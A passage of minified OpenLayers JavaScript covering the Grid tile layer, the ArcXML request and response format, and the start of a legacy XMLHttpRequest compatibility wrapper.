0!==a.singleTile&amp;&amp;a.singleTile!==this.singleTile;OpenLayers.Layer.HTTPRequest.prototype.addOptions.apply(this,arguments);this.map&amp;&amp;c&amp;&amp;(this.initProperties(),this.clearGrid(),this.tileSize=this.options.tileSize,this.setTileSize(),this.moveTo(null,!0))},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.Grid(this.name,this.url,this.params,this.getOptions()));a=OpenLayers.Layer.HTTPRequest.prototype.clone.apply(this, [a]);null!=this.tileSize&amp;&amp;(a.tileSize=this.tileSize.clone());a.grid=[];a.gridResolution=null;a.backBuffer=null;a.backBufferTimerId=null;a.loading=!1;a.numLoadingTiles=0;return a},moveTo:function(a,b,c){OpenLayers.Layer.HTTPRequest.prototype.moveTo.apply(this,arguments);a=a||this.map.getExtent();if(null!=a){var d=!this.grid.length||b,e=this.getTilesBounds(),f=this.map.getResolution();this.getServerResolution(f);if(this.singleTile){if(d||!c&amp;&amp;!e.containsBounds(a))b&amp;&amp;"resize"!==this.transitionEffect&amp;&amp; this.removeBackBuffer(),b&amp;&amp;"resize"!==this.transitionEffect||this.applyBackBuffer(f),this.initSingleTile(a)}else(d=d||!e.intersectsBounds(a,{worldBounds:this.map.baseLayer.wrapDateLine&amp;&amp;this.map.getMaxExtent()}))?(!b||"resize"!==this.transitionEffect&amp;&amp;this.gridResolution!==f||this.applyBackBuffer(f),this.initGriddedTiles(a)):this.moveGriddedTiles()}},getTileData:function(a){var b=null,c=a.lon,d=a.lat,e=this.grid.length;if(this.map&amp;&amp;e){var f=this.map.getResolution();a=this.tileSize.w;var g=this.tileSize.h, h=this.grid[0][0].bounds,k=h.left,h=h.top;if(c&lt;k&amp;&amp;this.map.baseLayer.wrapDateLine)var l=this.map.getMaxExtent().getWidth(),m=Math.ceil((k-c)/l),c=c+l*m;c=(c-k)/(f*a);d=(h-d)/(f*g);f=Math.floor(c);k=Math.floor(d);0&lt;=k&amp;&amp;k&lt;e&amp;&amp;(e=this.grid[k][f])&amp;&amp;(b={tile:e,i:Math.floor((c-f)*a),j:Math.floor((d-k)*g)})}return b},destroyTile:function(a){this.removeTileMonitoringHooks(a);a.destroy()},getServerResolution:function(a){var b=Number.POSITIVE_INFINITY;a=a||this.map.getResolution();if(this.serverResolutions&amp;&amp; -1===OpenLayers.Util.indexOf(this.serverResolutions,a)){var c,d,e,f;for(c=this.serverResolutions.length-1;0&lt;=c;c--){e=this.serverResolutions[c];d=Math.abs(e-a);if(d>b)break;b=d;f=e}a=f}return a},getServerZoom:function(){var a=this.getServerResolution();return this.serverResolutions?OpenLayers.Util.indexOf(this.serverResolutions,a):this.map.getZoomForResolution(a)+(this.zoomOffset||0)},applyBackBuffer:function(a){null!==this.backBufferTimerId&amp;&amp;this.removeBackBuffer();var b=this.backBuffer;if(!b){b= this.createBackBuffer();if(!b)return;a===this.gridResolution?this.div.insertBefore(b,this.div.firstChild):this.map.baseLayer.div.parentNode.insertBefore(b,this.map.baseLayer.div);this.backBuffer=b;var c=this.grid[0][0].bounds;this.backBufferLonLat={lon:c.left,lat:c.top};this.backBufferResolution=this.gridResolution}for(var c=this.backBufferResolution/a,d=b.childNodes,e,f=d.length-1;0&lt;=f;--f)e=d[f],e.style.top=(c*e._i*e._h|0)+"px",e.style.left=(c*e._j*e._w|0)+"px",e.style.width=Math.round(c*e._w)+ "px",e.style.height=Math.round(c*e._h)+"px";a=this.getViewPortPxFromLonLat(this.backBufferLonLat,a);c=this.map.layerContainerOriginPx.y;b.style.left=Math.round(a.x-this.map.layerContainerOriginPx.x)+"px";b.style.top=Math.round(a.y-c)+"px"},createBackBuffer:function(){var a;if(0&lt;this.grid.length){a=document.createElement("div");a.id=this.div.id+"_bb";a.className="olBackBuffer";a.style.position="absolute";var b=this.map;a.style.zIndex="resize"===this.transitionEffect?this.getZIndex()-1:b.Z_INDEX_BASE.BaseLayer- (b.getNumLayers()-b.getLayerIndex(this));for(var b=0,c=this.grid.length;b&lt;c;b++)for(var d=0,e=this.grid[b].length;d&lt;e;d++){var f=this.grid[b][d],g=this.grid[b][d].createBackBuffer();g&amp;&amp;(g._i=b,g._j=d,g._w=f.size.w,g._h=f.size.h,g.id=f.id+"_bb",a.appendChild(g))}}return a},removeBackBuffer:function(){if(this._transitionElement){for(var a=this.transitionendEvents.length-1;0&lt;=a;--a)OpenLayers.Event.stopObserving(this._transitionElement,this.transitionendEvents[a],this._removeBackBuffer);delete this._transitionElement}this.backBuffer&amp;&amp; (this.backBuffer.parentNode&amp;&amp;this.backBuffer.parentNode.removeChild(this.backBuffer),this.backBufferResolution=this.backBuffer=null,null!==this.backBufferTimerId&amp;&amp;(window.clearTimeout(this.backBufferTimerId),this.backBufferTimerId=null))},moveByPx:function(a,b){this.singleTile||this.moveGriddedTiles()},setTileSize:function(a){this.singleTile&amp;&amp;(a=this.map.getSize(),a.h=parseInt(a.h*this.ratio,10),a.w=parseInt(a.w*this.ratio,10));OpenLayers.Layer.HTTPRequest.prototype.setTileSize.apply(this,[a])},getTilesBounds:function(){var a= null,b=this.grid.length;if(b)var a=this.grid[b-1][0].bounds,b=this.grid[0].length*a.getWidth(),c=this.grid.length*a.getHeight(),a=new OpenLayers.Bounds(a.left,a.bottom,a.left+b,a.bottom+c);return a},initSingleTile:function(a){this.events.triggerEvent("retile");var b=a.getCenterLonLat(),c=a.getWidth()*this.ratio;a=a.getHeight()*this.ratio;b=new OpenLayers.Bounds(b.lon-c/2,b.lat-a/2,b.lon+c/2,b.lat+a/2);c=this.map.getLayerPxFromLonLat({lon:b.left,lat:b.top});this.grid.length||(this.grid[0]=[]);(a=this.grid[0][0])? a.moveTo(b,c):(a=this.addTile(b,c),this.addTileMonitoringHooks(a),a.draw(),this.grid[0][0]=a);this.removeExcessTiles(1,1);this.gridResolution=this.getServerResolution()},calculateGridLayout:function(a,b,c){var d=c*this.tileSize.w;c*=this.tileSize.h;var e=Math.floor((a.left-b.lon)/d)-this.buffer,f=this.rowSign;a=Math[~f?"floor":"ceil"](f*(b.lat-a.top+c)/c)-this.buffer*f;return{tilelon:d,tilelat:c,startcol:e,startrow:a}},getTileOrigin:function(){var a=this.tileOrigin;if(!a)var a=this.getMaxExtent(), b={tl:["left","top"],tr:["right","top"],bl:["left","bottom"],br:["right","bottom"]}[this.tileOriginCorner],a=new OpenLayers.LonLat(a[b[0]],a[b[1]]);return a},getTileBoundsForGridIndex:function(a,b){var c=this.getTileOrigin(),d=this.gridLayout,e=d.tilelon,f=d.tilelat,g=d.startcol,d=d.startrow,h=this.rowSign;return new OpenLayers.Bounds(c.lon+(g+b)*e,c.lat-(d+a*h)*f*h,c.lon+(g+b+1)*e,c.lat-(d+(a-1)*h)*f*h)},initGriddedTiles:function(a){this.events.triggerEvent("retile");var b=this.map.getSize(),c=this.getTileOrigin(), d=this.map.getResolution(),e=this.getServerResolution(),f=d/e,d=this.tileSize.w/f,f=this.tileSize.h/f,g=Math.ceil(b.h/f)+2*this.buffer+1,b=Math.ceil(b.w/d)+2*this.buffer+1;this.gridLayout=e=this.calculateGridLayout(a,c,e);var c=e.tilelon,h=e.tilelat,e=this.map.layerContainerOriginPx.x,k=this.map.layerContainerOriginPx.y,l=this.getTileBoundsForGridIndex(0,0),m=this.map.getViewPortPxFromLonLat(new OpenLayers.LonLat(l.left,l.top));m.x=Math.round(m.x)-e;m.y=Math.round(m.y)-k;var e=[],k=this.map.getCenter(), n=0;do{var p=this.grid[n];p||(p=[],this.grid.push(p));var q=0;do{var l=this.getTileBoundsForGridIndex(n,q),r=m.clone();r.x+=q*Math.round(d);r.y+=n*Math.round(f);var s=p[q];s?s.moveTo(l,r,!1):(s=this.addTile(l,r),this.addTileMonitoringHooks(s),p.push(s));r=l.getCenterLonLat();e.push({tile:s,distance:Math.pow(r.lon-k.lon,2)+Math.pow(r.lat-k.lat,2)});q+=1}while(l.right&lt;=a.right+c*this.buffer||q&lt;b);n+=1}while(l.bottom>=a.bottom-h*this.buffer||n&lt;g);this.removeExcessTiles(n,q);this.gridResolution=d=this.getServerResolution(); e.sort(function(a,b){return a.distance-b.distance});a=0;for(d=e.length;a&lt;d;++a)e[a].tile.draw()},getMaxExtent:function(){return this.maxExtent},addTile:function(a,b){var c=new this.tileClass(this,b,a,null,this.tileSize,this.tileOptions);this.events.triggerEvent("addtile",{tile:c});return c},addTileMonitoringHooks:function(a){a.onLoadStart=function(){!1===this.loading&amp;&amp;(this.loading=!0,this.events.triggerEvent("loadstart"));this.events.triggerEvent("tileloadstart",{tile:a});this.numLoadingTiles++; !this.singleTile&amp;&amp;(this.backBuffer&amp;&amp;this.gridResolution===this.backBufferResolution)&amp;&amp;OpenLayers.Element.addClass(a.getTile(),"olTileReplacing")};a.onLoadEnd=function(b){this.numLoadingTiles--;b="unload"===b.type;this.events.triggerEvent("tileloaded",{tile:a,aborted:b});if(!this.singleTile&amp;&amp;!b&amp;&amp;this.backBuffer&amp;&amp;this.gridResolution===this.backBufferResolution){var c=a.getTile();if("none"===OpenLayers.Element.getStyle(c,"display")){var d=document.getElementById(a.id+"_bb");d&amp;&amp;d.parentNode.removeChild(d)}OpenLayers.Element.removeClass(c, "olTileReplacing")}if(0===this.numLoadingTiles){if(this.backBuffer)if(0===this.backBuffer.childNodes.length)this.removeBackBuffer();else{this._transitionElement=b?this.div.lastChild:a.imgDiv;b=this.transitionendEvents;for(c=b.length-1;0&lt;=c;--c)OpenLayers.Event.observe(this._transitionElement,b[c],this._removeBackBuffer);this.backBufferTimerId=window.setTimeout(this._removeBackBuffer,this.removeBackBufferDelay)}this.loading=!1;this.events.triggerEvent("loadend")}};a.onLoadError=function(){this.events.triggerEvent("tileerror", {tile:a})};a.events.on({loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,loaderror:a.onLoadError,scope:this})},removeTileMonitoringHooks:function(a){a.unload();a.events.un({loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,loaderror:a.onLoadError,scope:this})},moveGriddedTiles:function(){for(var a=this.buffer+1;;){var b=this.grid[0][0],c=b.position.x+this.map.layerContainerOriginPx.x,b=b.position.y+this.map.layerContainerOriginPx.y,d=this.getServerResolution()/this.map.getResolution(), d={w:Math.round(this.tileSize.w*d),h:Math.round(this.tileSize.h*d)};if(c>-d.w*(a-1))this.shiftColumn(!0,d);else if(c&lt;-d.w*a)this.shiftColumn(!1,d);else if(b>-d.h*(a-1))this.shiftRow(!0,d);else if(b&lt;-d.h*a)this.shiftRow(!1,d);else break}},shiftRow:function(a,b){var c=this.grid,d=a?0:c.length-1,e=a?-1:1;this.gridLayout.startrow+=e*this.rowSign;for(var f=c[d],g=c[a?"pop":"shift"](),h=0,k=g.length;h&lt;k;h++){var l=g[h],m=f[h].position.clone();m.y+=b.h*e;l.moveTo(this.getTileBoundsForGridIndex(d,h),m)}c[a? "unshift":"push"](g)},shiftColumn:function(a,b){var c=this.grid,d=a?0:c[0].length-1,e=a?-1:1;this.gridLayout.startcol+=e;for(var f=0,g=c.length;f&lt;g;f++){var h=c[f],k=h[d].position.clone(),l=h[a?"pop":"shift"]();k.x+=b.w*e;l.moveTo(this.getTileBoundsForGridIndex(f,d),k);h[a?"unshift":"push"](l)}},removeExcessTiles:function(a,b){for(var c,d;this.grid.length>a;){var e=this.grid.pop();c=0;for(d=e.length;c&lt;d;c++){var f=e[c];this.destroyTile(f)}}c=0;for(d=this.grid.length;c&lt;d;c++)for(;this.grid[c].length> b;)e=this.grid[c],f=e.pop(),this.destroyTile(f)},onMapResize:function(){this.singleTile&amp;&amp;(this.clearGrid(),this.setTileSize())},getTileBounds:function(a){var b=this.maxExtent,c=this.getResolution(),d=c*this.tileSize.w,c=c*this.tileSize.h,e=this.getLonLatFromViewPortPx(a);a=b.left+d*Math.floor((e.lon-b.left)/d);b=b.bottom+c*Math.floor((e.lat-b.bottom)/c);return new OpenLayers.Bounds(a,b,a+d,b+c)},CLASS_NAME:"OpenLayers.Layer.Grid"});OpenLayers.Format.ArcXML=OpenLayers.Class(OpenLayers.Format.XML,{fontStyleKeys:"antialiasing blockout font fontcolor fontsize fontstyle glowing interval outline printmode shadow transparency".split(" "),request:null,response:null,initialize:function(a){this.request=new OpenLayers.Format.ArcXML.Request;this.response=new OpenLayers.Format.ArcXML.Response;if(a)if("feature"==a.requesttype){this.request.get_image=null;var b=this.request.get_feature.query;this.addCoordSys(b.featurecoordsys,a.featureCoordSys); this.addCoordSys(b.filtercoordsys,a.filterCoordSys);a.polygon?(b.isspatial=!0,b.spatialfilter.polygon=a.polygon):a.envelope&amp;&amp;(b.isspatial=!0,b.spatialfilter.envelope={minx:0,miny:0,maxx:0,maxy:0},this.parseEnvelope(b.spatialfilter.envelope,a.envelope))}else"image"==a.requesttype?(this.request.get_feature=null,b=this.request.get_image.properties,this.parseEnvelope(b.envelope,a.envelope),this.addLayers(b.layerlist,a.layers),this.addImageSize(b.imagesize,a.tileSize),this.addCoordSys(b.featurecoordsys, a.featureCoordSys),this.addCoordSys(b.filtercoordsys,a.filterCoordSys)):this.request=null;OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},parseEnvelope:function(a,b){b&amp;&amp;4==b.length&amp;&amp;(a.minx=b[0],a.miny=b[1],a.maxx=b[2],a.maxy=b[3])},addLayers:function(a,b){for(var c=0,d=b.length;c&lt;d;c++)a.push(b[c])},addImageSize:function(a,b){null!==b&amp;&amp;(a.width=b.w,a.height=b.h,a.printwidth=b.w,a.printheight=b.h)},addCoordSys:function(a,b){"string"==typeof b?(a.id=parseInt(b),a.string=b):"object"==typeof b&amp;&amp; null!==b.proj&amp;&amp;(a.id=b.proj.srsProjNumber,a.string=b.proj.srsCode)},iserror:function(a){var b=null;a?(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]),a=a.documentElement.getElementsByTagName("ERROR"),b=null!==a&amp;&amp;0&lt;a.length):b=""!==this.response.error;return b},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=null;a&amp;&amp;a.documentElement&amp;&amp;(b="ARCXML"==a.documentElement.nodeName?a.documentElement:a.documentElement.getElementsByTagName("ARCXML")[0]); if(!b||"parsererror"===b.firstChild.nodeName){var c,d;try{c=a.firstChild.nodeValue,d=a.firstChild.childNodes[1].firstChild.nodeValue}catch(e){}throw{message:"Error parsing the ArcXML request",error:c,source:d};}return this.parseResponse(b)},write:function(a){a||(a=this.request);var b=this.createElementNS("","ARCXML");b.setAttribute("version","1.1");var c=this.createElementNS("","REQUEST");if(null!=a.get_image){var d=this.createElementNS("","GET_IMAGE");c.appendChild(d);var e=this.createElementNS("", "PROPERTIES");d.appendChild(e);a=a.get_image.properties;null!=a.featurecoordsys&amp;&amp;(d=this.createElementNS("","FEATURECOORDSYS"),e.appendChild(d),0===a.featurecoordsys.id?d.setAttribute("string",a.featurecoordsys.string):d.setAttribute("id",a.featurecoordsys.id));null!=a.filtercoordsys&amp;&amp;(d=this.createElementNS("","FILTERCOORDSYS"),e.appendChild(d),0===a.filtercoordsys.id?d.setAttribute("string",a.filtercoordsys.string):d.setAttribute("id",a.filtercoordsys.id));null!=a.envelope&amp;&amp;(d=this.createElementNS("", "ENVELOPE"),e.appendChild(d),d.setAttribute("minx",a.envelope.minx),d.setAttribute("miny",a.envelope.miny),d.setAttribute("maxx",a.envelope.maxx),d.setAttribute("maxy",a.envelope.maxy));d=this.createElementNS("","IMAGESIZE");e.appendChild(d);d.setAttribute("height",a.imagesize.height);d.setAttribute("width",a.imagesize.width);if(a.imagesize.height!=a.imagesize.printheight||a.imagesize.width!=a.imagesize.printwidth)d.setAttribute("printheight",a.imagesize.printheight),d.setArrtibute("printwidth",a.imagesize.printwidth); null!=a.background&amp;&amp;(d=this.createElementNS("","BACKGROUND"),e.appendChild(d),d.setAttribute("color",a.background.color.r+","+a.background.color.g+","+a.background.color.b),null!==a.background.transcolor&amp;&amp;d.setAttribute("transcolor",a.background.transcolor.r+","+a.background.transcolor.g+","+a.background.transcolor.b));if(null!=a.layerlist&amp;&amp;0&lt;a.layerlist.length)for(d=this.createElementNS("","LAYERLIST"),e.appendChild(d),e=0;e&lt;a.layerlist.length;e++){var f=this.createElementNS("","LAYERDEF");d.appendChild(f); f.setAttribute("id",a.layerlist[e].id);f.setAttribute("visible",a.layerlist[e].visible);if("object"==typeof a.layerlist[e].query){var g=a.layerlist[e].query;if(0>g.where.length)continue;var h=null,h="boolean"==typeof g.spatialfilter&amp;&amp;g.spatialfilter?this.createElementNS("","SPATIALQUERY"):this.createElementNS("","QUERY");h.setAttribute("where",g.where);"number"==typeof g.accuracy&amp;&amp;0&lt;g.accuracy&amp;&amp;h.setAttribute("accuracy",g.accuracy);"number"==typeof g.featurelimit&amp;&amp;2E3>g.featurelimit&amp;&amp;h.setAttribute("featurelimit", g.featurelimit);"string"==typeof g.subfields&amp;&amp;"#ALL#"!=g.subfields&amp;&amp;h.setAttribute("subfields",g.subfields);"string"==typeof g.joinexpression&amp;&amp;0&lt;g.joinexpression.length&amp;&amp;h.setAttribute("joinexpression",g.joinexpression);"string"==typeof g.jointables&amp;&amp;0&lt;g.jointables.length&amp;&amp;h.setAttribute("jointables",g.jointables);f.appendChild(h)}"object"==typeof a.layerlist[e].renderer&amp;&amp;this.addRenderer(f,a.layerlist[e].renderer)}}else null!=a.get_feature&amp;&amp;(d=this.createElementNS("","GET_FEATURES"),d.setAttribute("outputmode", "newxml"),d.setAttribute("checkesc","true"),a.get_feature.geometry?d.setAttribute("geometry",a.get_feature.geometry):d.setAttribute("geometry","false"),a.get_feature.compact&amp;&amp;d.setAttribute("compact",a.get_feature.compact),"number"==a.get_feature.featurelimit&amp;&amp;d.setAttribute("featurelimit",a.get_feature.featurelimit),d.setAttribute("globalenvelope","true"),c.appendChild(d),null!=a.get_feature.layer&amp;&amp;0&lt;a.get_feature.layer.length&amp;&amp;(e=this.createElementNS("","LAYER"),e.setAttribute("id",a.get_feature.layer), d.appendChild(e)),a=a.get_feature.query,null!=a&amp;&amp;(e=null,e=a.isspatial?this.createElementNS("","SPATIALQUERY"):this.createElementNS("","QUERY"),d.appendChild(e),"number"==typeof a.accuracy&amp;&amp;e.setAttribute("accuracy",a.accuracy),null!=a.featurecoordsys&amp;&amp;(d=this.createElementNS("","FEATURECOORDSYS"),0==a.featurecoordsys.id?d.setAttribute("string",a.featurecoordsys.string):d.setAttribute("id",a.featurecoordsys.id),e.appendChild(d)),null!=a.filtercoordsys&amp;&amp;(d=this.createElementNS("","FILTERCOORDSYS"), 0===a.filtercoordsys.id?d.setAttribute("string",a.filtercoordsys.string):d.setAttribute("id",a.filtercoordsys.id),e.appendChild(d)),0&lt;a.buffer&amp;&amp;(d=this.createElementNS("","BUFFER"),d.setAttribute("distance",a.buffer),e.appendChild(d)),a.isspatial&amp;&amp;(d=this.createElementNS("","SPATIALFILTER"),d.setAttribute("relation",a.spatialfilter.relation),e.appendChild(d),a.spatialfilter.envelope?(f=this.createElementNS("","ENVELOPE"),f.setAttribute("minx",a.spatialfilter.envelope.minx),f.setAttribute("miny",a.spatialfilter.envelope.miny), f.setAttribute("maxx",a.spatialfilter.envelope.maxx),f.setAttribute("maxy",a.spatialfilter.envelope.maxy),d.appendChild(f)):"object"==typeof a.spatialfilter.polygon&amp;&amp;d.appendChild(this.writePolygonGeometry(a.spatialfilter.polygon))),null!=a.where&amp;&amp;0&lt;a.where.length&amp;&amp;e.setAttribute("where",a.where)));b.appendChild(c);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},addGroupRenderer:function(a,b){var c=this.createElementNS("","GROUPRENDERER");a.appendChild(c);for(var d=0;d&lt;b.length;d++)this.addRenderer(c, b[d])},addRenderer:function(a,b){if(OpenLayers.Util.isArray(b))this.addGroupRenderer(a,b);else{var c=this.createElementNS("",b.type.toUpperCase()+"RENDERER");a.appendChild(c);"VALUEMAPRENDERER"==c.tagName?this.addValueMapRenderer(c,b):"VALUEMAPLABELRENDERER"==c.tagName?this.addValueMapLabelRenderer(c,b):"SIMPLELABELRENDERER"==c.tagName?this.addSimpleLabelRenderer(c,b):"SCALEDEPENDENTRENDERER"==c.tagName&amp;&amp;this.addScaleDependentRenderer(c,b)}},addScaleDependentRenderer:function(a,b){"string"!=typeof b.lower&amp;&amp; "number"!=typeof b.lower||a.setAttribute("lower",b.lower);"string"!=typeof b.upper&amp;&amp;"number"!=typeof b.upper||a.setAttribute("upper",b.upper);this.addRenderer(a,b.renderer)},addValueMapLabelRenderer:function(a,b){a.setAttribute("lookupfield",b.lookupfield);a.setAttribute("labelfield",b.labelfield);if("object"==typeof b.exacts)for(var c=0,d=b.exacts.length;c&lt;d;c++){var e=b.exacts[c],f=this.createElementNS("","EXACT");"string"==typeof e.value&amp;&amp;f.setAttribute("value",e.value);"string"==typeof e.label&amp;&amp; f.setAttribute("label",e.label);"string"==typeof e.method&amp;&amp;f.setAttribute("method",e.method);a.appendChild(f);if("object"==typeof e.symbol){var g=null;"text"==e.symbol.type&amp;&amp;(g=this.createElementNS("","TEXTSYMBOL"));if(null!=g){for(var h=this.fontStyleKeys,k=0,l=h.length;k&lt;l;k++){var m=h[k];e.symbol[m]&amp;&amp;g.setAttribute(m,e.symbol[m])}f.appendChild(g)}}}},addValueMapRenderer:function(a,b){a.setAttribute("lookupfield",b.lookupfield);if("object"==typeof b.ranges)for(var c=0,d=b.ranges.length;c&lt;d;c++){var e= b.ranges[c],f=this.createElementNS("","RANGE");f.setAttribute("lower",e.lower);f.setAttribute("upper",e.upper);a.appendChild(f);if("object"==typeof e.symbol){var g=null;"simplepolygon"==e.symbol.type&amp;&amp;(g=this.createElementNS("","SIMPLEPOLYGONSYMBOL"));null!=g&amp;&amp;("string"==typeof e.symbol.boundarycolor&amp;&amp;g.setAttribute("boundarycolor",e.symbol.boundarycolor),"string"==typeof e.symbol.fillcolor&amp;&amp;g.setAttribute("fillcolor",e.symbol.fillcolor),"number"==typeof e.symbol.filltransparency&amp;&amp;g.setAttribute("filltransparency", e.symbol.filltransparency),f.appendChild(g))}}else if("object"==typeof b.exacts)for(c=0,d=b.exacts.length;c&lt;d;c++)e=b.exacts[c],f=this.createElementNS("","EXACT"),"string"==typeof e.value&amp;&amp;f.setAttribute("value",e.value),"string"==typeof e.label&amp;&amp;f.setAttribute("label",e.label),"string"==typeof e.method&amp;&amp;f.setAttribute("method",e.method),a.appendChild(f),"object"==typeof e.symbol&amp;&amp;(g=null,"simplemarker"==e.symbol.type&amp;&amp;(g=this.createElementNS("","SIMPLEMARKERSYMBOL")),null!=g&amp;&amp;("string"==typeof e.symbol.antialiasing&amp;&amp; g.setAttribute("antialiasing",e.symbol.antialiasing),"string"==typeof e.symbol.color&amp;&amp;g.setAttribute("color",e.symbol.color),"string"==typeof e.symbol.outline&amp;&amp;g.setAttribute("outline",e.symbol.outline),"string"==typeof e.symbol.overlap&amp;&amp;g.setAttribute("overlap",e.symbol.overlap),"string"==typeof e.symbol.shadow&amp;&amp;g.setAttribute("shadow",e.symbol.shadow),"number"==typeof e.symbol.transparency&amp;&amp;g.setAttribute("transparency",e.symbol.transparency),"string"==typeof e.symbol.usecentroid&amp;&amp;g.setAttribute("usecentroid", e.symbol.usecentroid),"number"==typeof e.symbol.width&amp;&amp;g.setAttribute("width",e.symbol.width),f.appendChild(g)))},addSimpleLabelRenderer:function(a,b){a.setAttribute("field",b.field);for(var c="featureweight howmanylabels labelbufferratio labelpriorities labelweight linelabelposition rotationalangles".split(" "),d=0,e=c.length;d&lt;e;d++){var f=c[d];b[f]&amp;&amp;a.setAttribute(f,b[f])}if("text"==b.symbol.type){var g=b.symbol,h=this.createElementNS("","TEXTSYMBOL");a.appendChild(h);c=this.fontStyleKeys;d=0; for(e=c.length;d&lt;e;d++)f=c[d],g[f]&amp;&amp;h.setAttribute(f,b[f])}},writePolygonGeometry:function(a){if(!(a instanceof OpenLayers.Geometry.Polygon))throw{message:"Cannot write polygon geometry to ArcXML with an "+a.CLASS_NAME+" object.",geometry:a};for(var b=this.createElementNS("","POLYGON"),c=0,d=a.components.length;c&lt;d;c++){for(var e=a.components[c],f=this.createElementNS("","RING"),g=0,h=e.components.length;g&lt;h;g++){var k=e.components[g],l=this.createElementNS("","POINT");l.setAttribute("x",k.x);l.setAttribute("y", k.y);f.appendChild(l)}b.appendChild(f)}return b},parseResponse:function(a){"string"==typeof a&amp;&amp;(a=(new OpenLayers.Format.XML).read(a));var b=new OpenLayers.Format.ArcXML.Response,c=a.getElementsByTagName("ERROR");if(null!=c&amp;&amp;0&lt;c.length)b.error=this.getChildValue(c,"Unknown error.");else{c=a.getElementsByTagName("RESPONSE");if(null==c||0==c.length)return b.error="No RESPONSE tag found in ArcXML response.",b;var d=c[0].firstChild.nodeName;"#text"==d&amp;&amp;(d=c[0].firstChild.nextSibling.nodeName);if("IMAGE"== d)c=a.getElementsByTagName("ENVELOPE"),a=a.getElementsByTagName("OUTPUT"),null==c||0==c.length?b.error="No ENVELOPE tag found in ArcXML response.":null==a||0==a.length?b.error="No OUTPUT tag found in ArcXML response.":(c=this.parseAttributes(c[0]),d=this.parseAttributes(a[0]),b.image="string"==typeof d.type?{envelope:c,output:{type:d.type,data:this.getChildValue(a[0])}}:{envelope:c,output:d});else if("FEATURES"==d){if(a=c[0].getElementsByTagName("FEATURES"),c=a[0].getElementsByTagName("FEATURECOUNT"), b.features.featurecount=c[0].getAttribute("count"),0&lt;b.features.featurecount)for(c=a[0].getElementsByTagName("ENVELOPE"),b.features.envelope=this.parseAttributes(c[0],"number"),a=a[0].getElementsByTagName("FEATURE"),c=0;c&lt;a.length;c++){for(var d=new OpenLayers.Feature.Vector,e=a[c].getElementsByTagName("FIELD"),f=0;f&lt;e.length;f++){var g=e[f].getAttribute("name"),h=e[f].getAttribute("value");d.attributes[g]=h}e=a[c].getElementsByTagName("POLYGON");if(0&lt;e.length){e=e[0].getElementsByTagName("RING"); f=[];for(g=0;g&lt;e.length;g++){h=[];h.push(this.parsePointGeometry(e[g]));for(var k=e[g].getElementsByTagName("HOLE"),l=0;l&lt;k.length;l++)h.push(this.parsePointGeometry(k[l]));f.push(new OpenLayers.Geometry.Polygon(h))}d.geometry=1==f.length?f[0]:new OpenLayers.Geometry.MultiPolygon(f)}b.features.feature.push(d)}}else b.error="Unidentified response type."}return b},parseAttributes:function(a,b){for(var c={},d=0;d&lt;a.attributes.length;d++)c[a.attributes[d].nodeName]="number"==b?parseFloat(a.attributes[d].nodeValue): a.attributes[d].nodeValue;return c},parsePointGeometry:function(a){var b=[],c=a.getElementsByTagName("COORDS");if(0&lt;c.length)for(a=this.getChildValue(c[0]),a=a.split(/;/),c=0;c&lt;a.length;c++){var d=a[c].split(/ /);b.push(new OpenLayers.Geometry.Point(d[0],d[1]))}else if(a=a.getElementsByTagName("POINT"),0&lt;a.length)for(c=0;c&lt;a.length;c++)b.push(new OpenLayers.Geometry.Point(parseFloat(a[c].getAttribute("x")),parseFloat(a[c].getAttribute("y"))));return new OpenLayers.Geometry.LinearRing(b)},CLASS_NAME:"OpenLayers.Format.ArcXML"}); OpenLayers.Format.ArcXML.Request=OpenLayers.Class({initialize:function(a){return OpenLayers.Util.extend(this,{get_image:{properties:{background:null,draw:!0,envelope:{minx:0,miny:0,maxx:0,maxy:0},featurecoordsys:{id:0,string:"",datumtransformid:0,datumtransformstring:""},filtercoordsys:{id:0,string:"",datumtransformid:0,datumtransformstring:""},imagesize:{height:0,width:0,dpi:96,printheight:0,printwidth:0,scalesymbols:!1},layerlist:[],output:{baseurl:"",legendbaseurl:"",legendname:"",legendpath:"", legendurl:"",name:"",path:"",type:"jpg",url:""}}},get_feature:{layer:"",query:{isspatial:!1,featurecoordsys:{id:0,string:"",datumtransformid:0,datumtransformstring:""},filtercoordsys:{id:0,string:"",datumtransformid:0,datumtransformstring:""},buffer:0,where:"",spatialfilter:{relation:"envelope_intersection",envelope:null}}},environment:{separators:{cs:" ",ts:";"}},layer:[],workspaces:[]})},CLASS_NAME:"OpenLayers.Format.ArcXML.Request"}); OpenLayers.Format.ArcXML.Response=OpenLayers.Class({initialize:function(a){return OpenLayers.Util.extend(this,{image:{envelope:null,output:""},features:{featurecount:0,envelope:null,feature:[]},error:""})},CLASS_NAME:"OpenLayers.Format.ArcXML.Response"});(function(){function a(){this._object=f&amp;&amp;!k?new f:new window.ActiveXObject("Microsoft.XMLHTTP");this._listeners=[]}function b(){return new a}function c(a){b.onreadystatechange&amp;&amp;b.onreadystatechange.apply(a);a.dispatchEvent({type:"readystatechange",bubbles:!1,cancelable:!1,timeStamp:new Date+0})}function d(a){try{a.responseText=a._object.responseText}catch(b){}try{var c;var d=a._object,e=d.responseXML,f=d.responseText;h&amp;&amp;(f&amp;&amp;e&amp;&amp;!e.documentElement&amp;&amp;d.getResponseHeader("Content-Type").match(/[^\/]+\/[^\+]+\+xml/))&amp;&amp; (e=new window.ActiveXObject("Microsoft.XMLDOM"),e.async=!1,e.validateOnParse=!1,e.loadXML(f));c=e&amp;&amp;(h&amp;&amp;0!=e.parseError||!e.documentElement||e.documentElement&amp;&amp;"parsererror"==e.documentElement.tagName)?null:e;a.responseXML=c}catch(g){}try{a.status=a._object.status}catch(k){}try{a.statusText=a._object.statusText}catch(u){}}function e(a){a._object.onreadystatechange=new window.Function}var f=window.XMLHttpRequest,g=!!window.controllers,h=window.document.all&amp;&amp;!window.opera,k=h&amp;&amp;window.navigator.userAgent.match(/MSIE 7.0/); 